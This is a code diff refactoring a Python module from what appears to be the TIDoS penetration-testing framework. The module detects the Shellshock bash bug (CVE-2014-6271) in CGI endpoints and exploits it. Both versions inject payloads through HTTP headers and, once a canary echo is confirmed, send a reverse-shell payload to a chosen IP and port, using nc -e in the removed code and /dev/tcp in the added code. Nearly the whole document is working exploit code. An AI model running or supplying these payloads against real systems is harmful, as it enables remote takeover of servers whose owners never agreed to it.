@@ -1,94 +1,85 @@
 #!/usr/bin/env python3
-# coding: utf-8
+# -*- coding: utf-8 -*-
+"""Shellshock (CVE-2014-6271) -- detect and optionally exploit a vulnerable CGI."""
 
-#-:-:-:-:-:-:-:-:-:-:-:-:#
-#    TIDoS Framework     #
-#-:-:-:-:-:-:-:-:-:-:-:-:#
+from __future__ import annotations
 
-#Author: @_tID
-#This module requires TIDoS Framework
-#https://github.com/0xInfection/TIDoS-Framework
+from core.methods import inject, modkit as kit
+from core.methods.print import psploit
 
-
-from core.methods.tor import session
-import time
-from random import *
-import string
-import re
-from core.Core.colors import *
-
-info = "Shellshock Exploit."
+info = ("Tests whether a CGI endpoint is vulnerable to Shellshock (CVE-2014-6271) by "
+        "injecting an `echo` of a random canary through several request headers and "
+        "confirming it appears in the response. If SHELL-IP and SHELL-PORT are set, a "
+        "reverse-shell payload is sent on confirmation -- run a listener first.")
 searchinfo = "Shellshock Exploit"
-properties = {"SHELL-IP":["IP for the reverse shell to connect to", " "], "SHELL-PORT":["Port for the reverse shell to connect to", " "]}
+properties = {
+    "PATH": ["CGI path to test, e.g. /cgi-bin/status (empty: the target URL)", ""],
+    "SHELL-IP": ["IP your reverse-shell listener is on (empty: detect only)", ""],
+    "SHELL-PORT": ["Port your reverse-shell listener is on (empty: detect only)", ""],
+}
 
-def shellshock0x00(web):
-    requests = session()
-    print(GR+' [*] Parsing strings...')
-    time.sleep(0.5)
-    r_str = ''.join(Random().sample(string.ascii_letters, 30))
-    print(GR+' [*] Configuring payloads...')
-    con = '() { :;}; echo; echo; echo %s'%(r_str)
-    cmd = "() { test;};/bin/nopatchobfu"
-    headers = {'User-agent': cmd}
-    time.sleep(0.5)
-    print(C+' [*] Making no-verify request...')
-    time.sleep(1)
-    r = requests.get(web, headers=headers, verify=False)
-    if r.status_code == 500 or r.status_code == 502:
-        print(G+' [+] The website seems Vulnerable to Shellshock...'+C+color.TR2+C)
-        time.sleep(0.5)
-        print(C+' [*] Confirming the vulnerability...'+C)
+# Headers reflected into CGI environment variables; each is a Shellshock vector.
+VECTORS = ("User-Agent", "Referer", "Cookie")
 
-        headers = {
-                    'User-Agent' : con,
-                    'Cookie'     : con,
-                    'Referer'    : con
-                }
 
-        resp = requests.get(web, headers=headers, verify=False)
-        if resp.status_code == 200:
-            if re.search(r_str,resp.content,re.I):
-                print(O+' [+] ShellShock was found in:'+C+color.TR3+C+G+resp.url+C+color.TR2+C)
-                print(P+' [*] Preparing for the exploitation phase...'+C)
-                time.sleep(0.4)
-                print(GR+' [*] Configuring payload...')
-                if properties["SHELL-IP"][1] == " ":
-                    ip = input(C+' [§] Enter reverse IP :> ')
-                else:
-                    ip = properties["SHELL-PORT"][1]
-                if properties["SHELL-IP"][1] == " ":
-                    port = input(' [§] Enter port :> ')
-                else:
-                    port = properties["SHELL-PORT"][1]
-                exp = '() { :; }; /bin/bash -c "nc -v '+str(ip)+' '+str(port)+' -e /bin/bash -i"'
-                time.sleep(0.7)
-                print(C+' [!] Using payload : '+B+exp)
-                print(GR+' [*] Exploiting...')
-                time.sleep(1)
-                print(P+' [!] Using no-verify mode to avoid IP leakage...'+C)
-                try:
-                    head = {'User-agent':exp}
-                    r=requests.get(web, headers=head, verify=False)
-                except Exception:
-                    print(R+' [-] Exploit failed...')
+def _target_url(web) -> str:
+    path = kit.option(properties, "PATH", "CGI path to test", "")
+    if not path:
+        return kit.url(web)
+    if path.startswith(("http://", "https://")):
+        return path
+    return kit.url(web) + "/" + path.lstrip("/")
 
-        else:
-            print(R+' [-] 2nd phase of detection does not reveal vulnerability...')
-            print(R+' [!] Please check manually...')
-    else:
-        print(R+' [-] The website seems immune to shellshock...')
 
-def shellshock_exp(web):
+def _probe(session, url: str, header: str):
+    """Send the canary payload through `header`; return the canary if reflected."""
+    canary = inject.marker()
+    payload = "() { :;}; echo; echo; echo %s" % canary
+    try:
+        resp = session.get(url, headers={header: payload})
+    except Exception:
+        return None
+    body = inject.text(resp)
+    return canary if canary in body else None
 
-    print(GR+'\n [*] Loading module...')
-    time.sleep(0.5)
-    #print(R+'\n    ================================')
-    #print(R+'     S H E L L S H O C K  (Exploit)')
-    #print(R+'    ================================\n')
-    from core.methods.print import psploit
-    psploit("shellshock") 
-    shellshock0x00(web)
+
+def shellshock(web):
+    psploit("shellshock")
+    url = _target_url(web)
+    session = kit.http(timeout=15)
+    kit.info(f"Testing {url} for Shellshock via {', '.join(VECTORS)} ...")
+
+    hit = None
+    for header in VECTORS:
+        canary = _probe(session, url, header)
+        if canary:
+            hit = header
+            break
+    if not hit:
+        kit.bad("Target does not appear vulnerable to Shellshock.")
+        return False
+
+    # Confirm with a second, independent canary before calling it a finding.
+    if not _probe(session, url, hit):
+        kit.warn(f"Canary reflected once via {hit} but not on re-test; treat as unconfirmed.")
+        return False
+    kit.found("Shellshock confirmed", f"{url} via the {hit} header")
+
+    ip = kit.option(properties, "SHELL-IP", "Reverse-shell IP", "")
+    port = kit.option(properties, "SHELL-PORT", "Reverse-shell port", "")
+    if not (ip and port):
+        kit.info("Set SHELL-IP and SHELL-PORT to deliver a reverse shell.")
+        return True
+
+    payload = '() { :; }; /bin/bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"' % (ip, port)
+    kit.warn(f"Sending reverse-shell payload to {ip}:{port} (have a listener ready)...")
+    try:
+        session.get(url, headers={hit: payload})
+        kit.info("Payload sent; check your listener.")
+    except Exception as e:
+        kit.bad(f"Exploit request failed: {type(e).__name__}: {e}")
+    return True
+
 
 def attack(web):
-    web = web.fullurl
-    shellshock_exp(web)
+    shellshock(web)
